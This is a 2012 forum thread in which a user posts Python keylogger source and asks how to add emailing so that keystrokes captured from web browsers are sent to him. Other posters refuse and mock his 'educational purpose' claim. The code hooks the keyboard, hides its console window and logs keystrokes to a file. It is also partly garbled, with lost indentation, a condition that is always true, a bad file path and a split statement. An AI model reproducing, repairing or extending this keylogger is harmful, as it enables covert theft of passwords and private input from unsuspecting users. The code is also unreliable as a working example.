---
title: "Create Python Keyloggers..."
date: 2012-12-22
forum: Programming Talk
---

### Post by ibracat on 2012-12-22
Good day all,

Here i Saw a Code to Create a Keylogger to send Information From a Web Browser (Opera, Mozilla , Chrome) To my Email, But i am having problems on where to insert the code so it can send the Information to my email.

I decided to copy a code i Saw online here.

Goes Like this...
[PHP]
#!/usr/bin/python


import win32api
import win32console
import win32gui
import smtplib

import pythoncom, pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win,0)

def OnKeyboardEvent(event):
if event.Ascii==5:

_exit(1)

if event.Ascii != 0 or 8:
f=open('c:output.txt','r')

buffer=f.read()
f.close()

f=open('c:output.txt','w')
keylogs=chr(event.Ascii)

if event.Ascii==13:
keylogs='/n'
buffer += 
keylogs
f.write(buffer)
f.close()

hm = pyHook.HookManager()
hm.KeyDown = OnKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()[/PHP]

Now the Question is, When Implementing the smtplib, where do i go about inserting the code, i am a lil confused here.

---

### Post by Bachstelze on 2012-12-22
Oh, this is funny. "I want to steal people's info so I just copy some code I found on the Interwebz but I have no clue how to use it so please do it for me."

No.

(I Also Like Using Capitals...)

---

### Post by ibracat on 2012-12-22
@Bachstelze : wrong for educational purpose only

---

### Post by lisati on 2012-12-22
My $0.02, which does not necessarily reflect an "official" view of this forum, says that if you're not sure how a code snippet works, the first place to look is the website where you found the code.

Putting on a slightly more official-looking hat, I'm wondering about the context in which you'll be using this code, which appears to be for MS Windows.

---

### Post by Bachstelze on 2012-12-22
> **ibracat said:**
> @Bachstelze : wrong for educational purpose only

Yeah, I've heard that story before. If you were really interested in getting educated, you would put in some effort to at least try to do it yourself.

A lot of people use Aircrack for "educational purposes", for example. Still, they couldn't explain even vaguely what the attack they are doing consists in, or even what the cipher they are attacking is. Talk about "educational"...

---

